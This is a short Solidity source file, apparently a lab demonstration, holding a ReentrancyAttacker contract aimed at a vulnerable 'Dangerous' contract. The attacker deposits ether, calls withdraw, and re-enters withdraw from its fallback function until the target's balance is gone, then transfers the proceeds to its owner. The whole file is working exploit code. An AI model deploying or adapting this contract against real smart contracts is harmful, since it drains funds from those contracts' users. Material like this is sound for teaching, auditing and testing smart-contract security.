// SPDX-License-Identifier: MIT
pragma solidity 0.4.24;

contract DangerousTarget {
    function depositMoney() public payable;
    function withdraw(uint256 amount) public;
}

/// @notice Demonstrates reentrancy against Dangerous on a private chain.
/// @dev The owner guard prevents unrelated accounts from operating this lab contract.
contract ReentrancyAttacker {
    DangerousTarget public target;
    address public owner;
    uint256 private withdrawalUnit;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address targetAddress) public {
        target = DangerousTarget(targetAddress);
        owner = msg.sender;
    }

    function attack() public payable onlyOwner {
        require(msg.value > 0);
        withdrawalUnit = msg.value;
        target.depositMoney.value(msg.value)();
        target.withdraw(msg.value);
    }

    function () public payable {
        uint256 remaining = address(target).balance;
        if (remaining > 0) {
            uint256 nextAmount = remaining < withdrawalUnit
                ? remaining
                : withdrawalUnit;
            target.withdraw(nextAmount);
        }
    }

    function collect() public onlyOwner {
        owner.transfer(address(this).balance);
    }
}
